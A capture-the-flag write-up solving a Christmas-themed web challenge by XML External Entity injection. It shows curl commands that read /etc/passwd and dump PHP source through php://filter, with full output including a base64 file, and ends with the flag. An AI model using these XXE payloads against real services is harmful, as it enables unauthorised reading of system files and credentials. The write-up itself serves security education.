# Our Christmas Wishlist
Web

## Challenge 

	We have all gathered round to write down our wishes and desires for this Christmas! Please don't write anything mean, Santa will be reading this!

	Server: http://199.247.6.180:12001

	Author: Milkdrop

## Solution

Embedded javascript

	function lol () {
		var xhttp = new XMLHttpRequest();
		xhttp.onreadystatechange = function() {
			if (xhttp.readyState == 4 && xhttp.status == 200) {
				document.location.reload();
			}
		};
		
		var xml = "<message>" + document.getElementById("textarea").value + "</message>";
		xhttp.open("POST", "/", true);
		xhttp.setRequestHeader('Content-Type', 'application/xml');
		xhttp.send(xml);
	};

It looks like it is doing a POST request of an XML content. Do the same in command line...

	$ curl -X POST -H "Content-Type: text/xml" -d '<message>hello_world</message>' http://95.179.163.167:12001
	Your wish: hello_world

Works for any XML tag.

	$ curl -X POST -H "Content-Type: text/xml" -d '<hello>hi</hello>' http://95.179.163.167:12001
	Your wish: hi

From this we know the page source code is at `/var/www/html/index.php`...

	$ curl -X POST -H "Content-Type: text/xml" -d 'hi' http://95.179.163.167:12001
	<br />
	<b>Warning</b>:  simplexml_load_string(): Entity: line 1: parser error : Start tag expected, '&lt;' not found in <b>/var/www/html/index.php</b> on line <b>18</b><br />
	<br />
	<b>Warning</b>:  simplexml_load_string(): hi in <b>/var/www/html/index.php</b> on line <b>18</b><br />
	<br />
	<b>Warning</b>:  simplexml_load_string(): ^ in <b>/var/www/html/index.php</b> on line <b>18</b><br />

---

## XML External Entity (XXE) Exploit

From `simplexml_load_string`, we know that this is vulnerable to XXE.

References:
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20injection/README.md
- https://chybeta.github.io/2017/07/04/%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/

For example the filesystem passwd...

	<?xml version="1.0" encoding="utf-8"?>
	<!DOCTYPE root [<!ENTITY  file SYSTEM "file:///etc/passwd">]>
	<root>&file;</root>

Doing so, it is successful

	$ curl -X POST -H "Content-Type: text/xml" -d '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE root [<!ENTITY  file SYSTEM "file:///etc/passwd">]><root>&file;</root>' http://95.179.163.167:12001
	Your wish: root:x:0:0:root:/root:/bin/ash
	bin:x:1:1:bin:/bin:/sbin/nologin
	daemon:x:2:2:daemon:/sbin:/sbin/nologin
	adm:x:3:4:adm:/var/adm:/sbin/nologin
	lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
	sync:x:5:0:sync:/sbin:/bin/sync
	shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
	halt:x:7:0:halt:/sbin:/sbin/halt
	mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
	news:x:9:13:news:/usr/lib/news:/sbin/nologin
	uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
	operator:x:11:0:operator:/root:/bin/sh
	man:x:13:15:man:/usr/man:/sbin/nologin
	postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
	cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
	ftp:x:21:21::/var/lib/ftp:/sbin/nologin
	sshd:x:22:22:sshd:/dev/null:/sbin/nologin
	at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
	squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
	xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
	games:x:35:35:games:/usr/games:/sbin/nologin
	postgres:x:70:70::/var/lib/postgresql:/bin/sh
	cyrus:x:85:12::/usr/cyrus:/sbin/nologin
	vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
	ntp:x:123:123:NTP:/var/empty:/sbin/nologin
	smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
	guest:x:405:100:guest:/dev/null:/sbin/nologin
	nobody:x:65534:65534:nobody:/:/sbin/nologin
	www-data:x:82:82:Linux User,,,:/home/www-data:/bin/false
	nginx:x:100:101:Linux User,,,:/var/cache/nginx:/sbin/nologin

And to read php files, we need to use `php://filter`...

	<?xml version="1.0" encoding="utf-8"?>
	<!DOCTYPE root [<!ENTITY  file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">]>
	<root>&file;</root>

Hence...

	$ curl -X POST -H "Content-Type: text/xml" -d '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE root [<!ENTITY  file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">]><root>&file;</root>' http://95.179.163.167:12001
	Your wish: PD9waHAKLy9lcnJvcl9yZXBvcnRpbmcoMCk7Ci8vJGNvbm4gPSBuZXcgbXlzcWxpKCJsb2NhbGhvc3Q6MzMwNi9ydW4vbXlzcWxkL215c3FsZC5zb2NrIiwgInJvb3QiLCAiSFRzUEFjY2Vzc0tleSIpOwoKLy9pZiAoJGNvbm4tPmNvbm5lY3RfZXJyb3IpCgkvL2RpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiAkY29ubi0+Y29ubmVjdF9lcnJvcik7CgovLyRjb25uLT5xdWVyeSgiVVNFIHdpc2hlcyIpOwoKc2Vzc2lvbl9zdGFydCgpOwoKaWYgKCFpc3NldCgkX1NFU1NJT05bJ3dpc2hlcyddKSkgewoJJF9TRVNTSU9OWyd3aXNoZXMnXSA9IGFycmF5KCk7Cn0KCmxpYnhtbF9kaXNhYmxlX2VudGl0eV9sb2FkZXIoZmFsc2UpOwokZGF0YVBPU1QgPSB0cmltKGZpbGVfZ2V0X2NvbnRlbnRzKCdwaHA6Ly9pbnB1dCcpKTsKJHhtbERhdGEgPSBzaW1wbGV4bWxfbG9hZF9zdHJpbmcoJGRhdGFQT1NULCAnU2ltcGxlWE1MRWxlbWVudCcsIExJQlhNTF9OT0VOVCk7CgppZiAoJHhtbERhdGEgIT0gIiIpIHsKCSRfU0VTU0lPTlsnd2lzaGVzJ11bXSA9IChzdHJpbmcpICR4bWxEYXRhOwoJLy8kc3FsID0gIklOU0VSVCBJTlRPIHdpc2hlcyAoSVAsIHRpbWVzdGFtcCwgbWVzc2FnZSkgVkFMVUVTICgnIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIicsICciIC4gdGltZSgpIC4gIicsICciIC4gbXlzcWxpX3JlYWxfZXNjYXBlX3N0cmluZygkY29ubiwgKHN0cmluZykgJHhtbERhdGEpIC4gIicpIjsKCS8vaWYgKCRjb25uLT5xdWVyeSgkc3FsKSA9PT0gVFJVRSkgewoJLy8JZWNobyAiTmV3IHJlY29yZCBjcmVhdGVkIHN1Y2Nlc3NmdWxseSAiOwoJLy99IGVsc2UgewoJLy8JZWNobyAiRXJyb3IhICI7CgkvL30KfQoKaWYgKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddID09PSAnUE9TVCcpIHsKCWVjaG8gIllvdXIgd2lzaDogIiAuICR4bWxEYXRhOwoJZGllKCk7Cn0KCi8vJHdpc2hlcyA9ICRjb25uLT5xdWVyeSgiU0VMRUNUICosIG1lc3NhZ2UgRlJPTSB3aXNoZXMgT1JERVIgQlkgdGltZXN0YW1wIERFU0MiKTsKPz4KCjxoZWFkPgo8bGluayBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9TW91bnRhaW5zK29mK0NocmlzdG1hcyIgcmVsPSJzdHlsZXNoZWV0Ij4KPC9oZWFkPgoKPHN0eWxlPgoudGV4dCB7Cglmb250LWZhbWlseTogJ01vdW50YWlucyBvZiBDaHJpc3RtYXMnLCBjdXJzaXZlOwp9Cgp0ZXh0YXJlYSB7CglyZXNpemU6IG5vbmU7CmJveC1zaGFkb3c6CgkwIDAgMCAycHggI0ZGRkZGRiwKCTAgMCAwIDRweCAjRkYwMDAwOwotbW96LWJveC1zaGFkb3c6CgkwIDAgMCA0cHggI0ZGRkZGRiwKCTAgMCAwIDJweCAjRkYwMDAwOwotd2Via2l0LXNoYWRvdzoKCTAgMCAwIDRweCAjRkZGRkZGLAoJMCAwIDAgMnB4ICNGRjAwMDA7Cn0KCmJ1dHRvbiB7CgliYWNrZ3JvdW5kLWNvbG9yOiBUcmFuc3BhcmVudDsKCWJhY2tncm91bmQtcmVwZWF0OiBuby1yZXBlYXQ7Cglib3JkZXI6IG5vbmU7CgljdXJzb3I6IHBvaW50ZXI7CglvdmVyZmxvdzogaGlkZGVuOwoJb3V0bGluZTpub25lOwoJYmFja2dyb3VuZDogdXJsKCJwYXBlcl9haXJwbGFuZS5wbmciKTsKCWJhY2tncm91bmQtc2l6ZTpjb3ZlcjsKCWhlaWdodDo2NHB4OwoJd2lkdGg6NjRweDsKCW9wYWNpdHk6MC42Owp9CgpsaSB7Cglmb250LXNpemU6IDI0cHg7Cgl3b3JkLXdyYXA6IGJyZWFrLXdvcmQ7Cn0KPC9zdHlsZT4KCjxzY3JpcHQ+CmZ1bmN0aW9uIGxvbCAoKSB7Cgl2YXIgeGh0dHAgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKCXhodHRwLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uKCkgewoJCWlmICh4aHR0cC5yZWFkeVN0YXRlID09IDQgJiYgeGh0dHAuc3RhdHVzID09IDIwMCkgewoJCQlkb2N1bWVudC5sb2NhdGlvbi5yZWxvYWQoKTsKCQl9Cgl9OwoJCgl2YXIgeG1sID0gIjxtZXNzYWdlPiIgKyBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgidGV4dGFyZWEiKS52YWx1ZSArICI8L21lc3NhZ2U+IjsKCXhodHRwLm9wZW4oIlBPU1QiLCAiLyIsIHRydWUpOwoJeGh0dHAuc2V0UmVxdWVzdEhlYWRlcignQ29udGVudC1UeXBlJywgJ2FwcGxpY2F0aW9uL3htbCcpOwoJeGh0dHAuc2VuZCh4bWwpOwp9Owo8L3NjcmlwdD4KCjxib2R5IGJhY2tncm91bmQ9InBhcGVyLmpwZyIgc3R5bGUgPSAibWFyZ2luLWxlZnQ6MjVweDsgbWFyZ2luLXRvcDoyNXB4OyI+Cgk8cCBjbGFzcz0idGV4dCIgc3R5bGU9ImZvbnQtc2l6ZTogNjBweCI+T3VyIENocmlzdG1hcyBXaXNobGlzdCE8L3A+Cgk8dGV4dGFyZWEgaWQ9InRleHRhcmVhIiByb3dzPSI2IiBjb2xzPSI1MCIgcGxhY2Vob2xkZXI9Ikkgd2lzaCBmb3IgYSBwb255Li4uIiBjbGFzcz0idGV4dCIgc3R5bGU9ImZvbnQtc2l6ZTogMzBweCI+PC90ZXh0YXJlYT4KCTxidXR0b24gc3R5bGU9InBvc2l0aW9uOnJlbGF0aXZlOyBib3R0b206OTBweDsgbGVmdDoyMHB4OyIgb25jbGljaz0ibG9sKCk7Ij48L2J1dHRvbj4KCQoJPGRpdiBzdHlsZT0ibWFyZ2luLXRvcDoyNHB4OyI+CgkJPD9waHAKCQkJZm9yZWFjaCgkX1NFU1NJT05bJ3dpc2hlcyddIGFzICRtc2cpIHsKCQkJCWVjaG8gJzxsaT4nIC4gJG1zZyAuICc8L2xpPjxocj4nOwoJCQl9CgkJPz4KCTwvZGl2Pgo8L2JvZHk+Cg==

We are greeted with a base64 encoded PHP file, and we can read the source code.

So let's write a simple script to do file retrievals

	$ ruby solve.rb <filename>

With lots of traversing, I eventually found the flag

	$ ruby solve.rb /var/www/html/flag.txt
	Your wish: WC1NQVN7X1RoZV9FeDczcm5hbF9FbnQxdDEzJF9XNG43X1RvX19KbzFuXzdoZV9wNHI3eV9fNzAwX19fX19ffQo=
	X-MAS{_The_Ex73rnal_Ent1t13$_W4n7_To__Jo1n_7he_p4r7y__700______}


## Flag

	X-MAS{_The_Ex73rnal_Ent1t13$_W4n7_To__Jo1n_7he_p4r7y__700______}